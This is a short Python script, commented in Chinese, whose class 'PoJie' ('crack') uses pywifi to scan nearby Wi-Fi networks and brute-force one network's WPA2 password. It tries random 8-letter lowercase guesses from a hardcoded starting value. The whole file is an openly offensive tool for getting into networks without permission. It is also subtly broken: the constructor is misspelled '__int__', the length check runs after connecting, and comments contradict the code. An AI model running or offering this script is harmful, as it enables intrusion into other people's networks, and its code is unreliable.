# coding:utf-8
import time  # 时间
import pywifi  # 破解wifi
from pywifi import const  # 引用一些定义
import random
import string

class PoJie():
    def __int__(self):
        wifi = pywifi.PyWiFi()  # 抓取网卡接口
        self.iface = wifi.interfaces()[0]  # 抓取第一个无限网卡
        self.iface.disconnect()  # 测试链接断开所有链接
        time.sleep(1)  # 休眠1秒
        self.list = self.initialssidnamelist()
        # 测试网卡是否属于断开状态，
        assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

    def bies(self):
        self.iface.scan()  # 扫描
        bessis = self.iface.scan_results()
        list = []
        for data in bessis:
            list.append((data.ssid, data.signal))
        return len(list), sorted(list, key=lambda st: st[1], reverse=True)

    def getsignal(self):
        while True:
            n, data = self.bies()
            time.sleep(1)
            if n is not 0:
                return data[0:10]

    def initialssidnamelist(self):
        ssidlist = self.getsignal()
        namelist = []
        for item in ssidlist:
            namelist.append(item[0])
        return namelist

    def readPassWord(self, ssidname, myStr):

        bool1 = self.test_connect(myStr, ssidname)
        if len(myStr) < 8:
            return False
        if bool1:
            print("密码+++++++++++++正确：" + myStr + "   " + ssidname)
            return True
        else:
            print("密码错误:" + myStr + "   " + ssidname)
            return False

    def test_connect(self, findStr, ssidname):  # 测试链接

        profile = pywifi.Profile()  # 创建wifi链接文件
        profile.ssid = ssidname  # wifi名称
        # profile.ssid ="Netcore" #wifi名称
        profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放，
        profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
        profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
        profile.key = findStr  # 密码

        self.iface.remove_all_network_profiles()  # 删除所有的wifi文件
        tmp_profile = self.iface.add_network_profile(profile)  # 设定新的链接文件
        self.iface.connect(tmp_profile)  # 链接
        time.sleep(2)
        if self.iface.status() == const.IFACE_CONNECTED:  # 判断是否连接上
            isOK = True
        else:
            isOK = False
        self.iface.disconnect()  # 断开
        time.sleep(1)
        # 检查断开状态
        assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
        return isOK

    def run(self):
        passwds = []
        # 生成随机密码的种子
        src = string.ascii_lowercase
        # string.ascii_letters
        # 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        # string.ascii_lowercase
        # 'abcdefghijklmnopqrstuvwxyz'
        # string.ascii_uppercase
        # 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        # string.digits
        # '0123456789'
        # string.letters
        # 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
        # string.lowercase
        # 'abcdefghijklmnopqrstuvwxyz'
        # string.uppercase
        # 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        # string.octdigits
        # '01234567'
        # string.punctuation
        # '!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
        # string.printable
        # '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c'
        # 默认的密码
        myStr = u'13263468123.'
        # 第一个wifi
        wifi_frist = self.list[4]
        while True:
            list_passwd_all = random.sample(src, 8)  # 从字母和数字中随机取5位
            random.shuffle(list_passwd_all)  # 打乱列表顺序
            # 将列表转化为字符串
            if myStr not in passwds:  # 判断是否生成重复密码
                passwds.append(myStr)
                ret = self.readPassWord(wifi_frist, u'' + myStr)
                myStr = u''.join(list_passwd_all)
                if ret:
                    return


if __name__ == '__main__':
    pojie = PoJie()
    pojie.run()
